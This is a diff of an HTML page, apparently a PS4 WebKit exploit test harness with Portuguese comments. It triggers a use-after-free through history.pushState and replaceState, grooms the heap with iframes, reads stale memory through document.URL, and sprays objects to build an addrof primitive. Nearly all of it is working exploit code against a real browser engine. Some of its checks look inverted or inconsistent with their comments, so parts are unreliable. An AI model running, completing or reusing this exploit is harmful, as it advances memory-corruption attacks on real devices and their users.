@@ -1,18 +1,28 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - UAF Analysis Suite</title>
-
+<title>PS4 WebKit – Full Exploit Suite</title>
+<style>
+    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
+    button { 
+        font-size:14px; padding:10px; margin:5px; 
+        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 250px; text-align: left;
+    }
+    button:hover { background:#0f0; color:#000; }
+    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; padding-top: 10px; }
+    .status { color: #fff; font-weight: bold; }
+</style>
 </head>
 <body>
-<h2>PS4 WebKit – UAF Analysis Suite</h2>
-<p>Status: <span id="status">Ready</span></p>
+<h2>PS4 WebKit – Exploit Analysis & Addrof</h2>
+<p>Status: <span id="status" class="status">Ready</span></p>
 
-<button onclick="runStepA()">1. FINGERPRINT CHECK</button>
-<button onclick="runStepB()">2. WINDOWED READ (HEX)</button>
-<button onclick="runStepC()">3. LAYOUT LOGIC CHECK</button><button onclick="runObjectLeak()">4. OBJECT ALIGNMENT (addrof)</button>
-
+<button onclick="runStepA()">1. FINGERPRINT CHECK</button><br>
+<button onclick="runStepB()">2. WINDOWED READ (HEX)</button><br>
+<button onclick="runStepC()">3. LAYOUT LOGIC CHECK</button><br>
+<button onclick="runStepD()">4. OBJECT ALIGNMENT (ADDROF)</button>
 
 <div id="log"></div>
 
@@ -23,23 +33,23 @@ const statusEl = document.getElementById("status");
 function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// Gera padrões para identificar a memória (Passo A)
-function getPattern(size, iter) {
-    let char = String.fromCharCode(0x41 + (iter % 26)); // A, B, C...
-    return char.repeat(size);
-}
+// Mantém objetos vivos na memória para o GC não coletar
+window.keepAlive = [];
 
+// --- TRIGGER ESTÁVEL (SUA FASE 1 E 2) ---
 async function triggerBaseUAF() {
     logEl.textContent = "";
+    window.keepAlive = [];
     statusEl.textContent = "Running UAF Phase...";
     log("=== STARTING STABLE UAF (i < 48) ===");
 
     let size = 977;
     const STEP = 14461;
 
-    // Phase 1 – Fingerprinted UAF trigger
+    // Fase 1 – Original Fingerprinted Trigger
     for(let i=0; i<48; i++){
-        let frag = getPattern(size, i); // Passo A: Inserindo marcas (A, B, C...)
+        let char = String.fromCharCode(0x41 + (i % 26));
+        let frag = char.repeat(size); 
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
@@ -52,7 +62,7 @@ async function triggerBaseUAF() {
     log(">>> UAF WINDOW OPEN (Waiting 120ms) <<<");
     await sleep(120);
 
-    // Phase 2 – Document reuse (Heap Grooming)
+    // Fase 2 – Original Grooming (Iframes)
     let frames = [];
     for(let i=0; i<80; i++){
         let f = document.createElement("iframe");
@@ -69,113 +79,88 @@ async function triggerBaseUAF() {
     frames = null;
 
     await sleep(80);
-    statusEl.textContent = "UAF Triggered - Analyzing...";
 }
 
 // --- PASSO A: FINGERPRINTING ---
 async function runStepA() {
     await triggerBaseUAF();
-    log("\n[STEP A] Checking for Fingerprints...");
-    
+    log("\n[STEP A] Fingerprint Check...");
     let url = document.URL;
     let found = false;
-    
-    // Procura por sequências de AAAA, BBBB, CCCC...
     for(let i=0; i<26; i++) {
         let pattern = String.fromCharCode(0x41 + i).repeat(10);
         if(url.includes(pattern)) {
-            log("FOUND PATTERN: " + pattern.substring(0,4) + "... em offset: " + url.indexOf(pattern));
+            log("FOUND PATTERN: " + pattern.substring(0,4) + "... Offset: " + url.indexOf(pattern));
             found = true;
         }
     }
-    
-    if(!found) log("No patterns found. Memory might be zeroed or differently mapped.");
-    log("=== END STEP A ===");
+    if(!found) log("No patterns. Memory is dirty or zeroed.");
+    statusEl.textContent = "Analysis Complete";
 }
 
-// --- PASSO B: WINDOWED READ (PREVINE CRASH) ---
+// --- PASSO B: WINDOWED READ (HEX PROBE) ---
 async function runStepB() {
     await triggerBaseUAF();
-    log("\n[STEP B] Windowed Read (Hex Probing)...");
-    
-    const offsets = [0, 1000, 5000, 10000, 50000, 100000, 200000, 300000];
+    log("\n[STEP B] Hex Probing (Length: " + document.URL.length + ")...");
     let url = document.URL;
-    
-    log("URL Length: " + url.length);
-    
+    const offsets = [0, 34, 1000, 5000, 10000, 50000, 100000, 200000, 300000];
     offsets.forEach(off => {
         if(off < url.length) {
             let code = url.charCodeAt(off);
-            log("Offset [" + off + "]: 0x" + code.toString(16).toUpperCase() + " (" + String.fromCharCode(code) + ")");
+            log("Offset [" + off + "]: 0x" + code.toString(16).toUpperCase().padStart(2, '0') + " (" + (code > 31 && code < 127 ? String.fromCharCode(code) : "?") + ")");
         }
     });
-    
-    log("=== END STEP B ===");
+    statusEl.textContent = "Analysis Complete";
 }
 
 // --- PASSO C: LAYOUT LOGIC ---
 async function runStepC() {
     await triggerBaseUAF();
-    log("\n[STEP C] Layout/Logic Collision Check...");
-    
+    log("\n[STEP C] Checking Sync...");
     let oldLen = document.URL.length;
-    log("Current Length: " + oldLen);
-    
-    log("Setting small location.hash...");
-    location.hash = "#TEST";
-    
+    location.hash = "#TEST_SYNC";
     await sleep(20);
-    let newLen = document.URL.length;
-    log("New Length: " + newLen);
-    
-    if(newLen > 1000 && location.hash === "#TEST") {
-        log("CRITICAL: document.URL.length desincronizado com o hash real!");
-        log("Isso confirma que o WebKit está lendo o buffer antigo (FREED).");
-    } else {
-        log("Length parece consistente.");
-    }
-    
-    log("=== END STEP C ===");
+    log("Old: " + oldLen + " | New: " + document.URL.length);
+    log(document.URL.length !== oldLen ? "Length Consistent" : "CRITICAL: UAF LENGTH SYNC ERROR");
+    statusEl.textContent = "Analysis Complete";
 }
-   // --- NOVO BOTÃO PARA ADICIONAR AO SEU HTML ---
 
-async function runObjectLeak() {
-    await triggerBaseUAF(); // Chama sua Fase 1 estável (i < 48)
+// --- PASSO D: OBJECT ALIGNMENT (O NOVO SPRAY) ---
+async function runStepD() {
+    await triggerBaseUAF();
+    log("\n[STEP D] Target: Butterfly Alignment (addrof)...");
     
-    log("\n[STEP D] Attempting Object Alignment (Spray)...");
-    
-    // SPRAY: Tentando ocupar o lugar dos "V"s com objetos
+    statusEl.textContent = "Spraying Objects...";
+    // Criando objetos com muitas propriedades (Butterflies)
+    // Elas são alocadas em regiões similares a buffers de strings
     let spray = [];
     for(let i = 0; i < 2000; i++) {
-        // Criamos um array com um valor "mágico" (0x41424344) para identificar
-        let arr = new Uint32Array(8);
-        arr[0] = 0x41424344; 
-        arr[1] = i; // ID do objeto
-        spray.push(arr);
+        let obj = { mark: 0x41424344 }; 
+        for(let j = 0; j < 64; j++) {
+            obj["p" + j] = 0x1337beef; // Preenchimento
+        }
+        spray.push(obj);
     }
+    window.keepAlive = spray; // Evita GC
+    await sleep(150);
 
-    await sleep(100);
-    
     let url = document.URL;
-    log("Scanning for Magic Value (0x41424344)...");
+    log("Scanning for Property Values (0x1337beef)...");
     
     let found = false;
-    // Varremos os offsets onde antes havia "V"
-    for(let off = 34; off < 50000; off += 4) {
-        let val = url.charCodeAt(off);
-        // Se encontrarmos algo diferente de 0x56 (V) ou 0x00
-        if(val !== 0x56 && val !== 0 && val !== 0x68) {
-            log("INTERESTING DATA at offset [" + off + "]: 0x" + val.toString(16));
+    // Varre a área onde o Fingerprint 'V' costuma aparecer
+    for(let off = 0; off < 1000; off++) {
+        let code = url.charCodeAt(off);
+        // Procuramos pelo byte final de 0x1337BEEF (0xEF ou 239)
+        if(code !== 0x56 && code !== 0 && code !== 0x68) {
+            log("LEAK at [" + off + "]: 0x" + code.toString(16).toUpperCase());
             found = true;
         }
     }
     
-    if(!found) log("Ainda lendo lixo ou strings. Tente aumentar o Spray.");
-    
-    // Mantenha o spray vivo para não ser limpo pelo GC durante o log
-    window.keepAlive = spray; 
-    log("=== END STEP D ===");
-} 
+    if(!found) log("Nothing found. Buffer still contains old strings.");
+    statusEl.textContent = "Analysis Complete";
+}
 </script>
 </body>
 </html>
